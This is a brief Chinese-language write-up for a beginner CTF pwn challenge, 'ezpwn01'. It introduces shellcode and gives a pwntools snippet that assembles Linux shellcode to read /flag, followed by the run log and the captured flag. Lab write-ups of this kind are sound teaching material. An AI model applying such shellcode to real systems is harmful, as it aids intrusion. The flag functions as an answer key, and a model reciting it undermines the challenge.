# [ezpwn01](https://ctf.xidian.edu.cn/games/37/challenges?challenge=1379)
##### 分值：100pts

## 题目描述：
### 原文：
> ezpwn 是一组方便你入门的低分题目，出题人也刚刚学 pwn，边学边出了。
>
> 有什么建议或者想喷我都可以发🔨。

Shellcode 是一段可以直接交由 CPU 执行的底层机器码。在现代二进制安全中，通常会结合工具（如 pwntools 的 shellcraft）自动生成特定架构和操作系统的 Shellcode。

查看 https://docs.pwntools.com/en/stable/index.html 学习使用 pwntools



## 分析：
### shellcode

## 解题步骤：
```python
from pwn import *
context.arch = 'amd64'
context.os = 'linux'
payload = asm(shellcraft.cat("/flag"))
```
```log
[web] building payload with pwntools...
Send your pwntools shellcode.
Shellcode is running.
moectf{899dc6d0-666b-2d10-b732-2c6f8733e216}[web] chall exited with code -11
```
## Flag
moectf{899dc6d0-666b-2d10-b732-2c6f8733e216}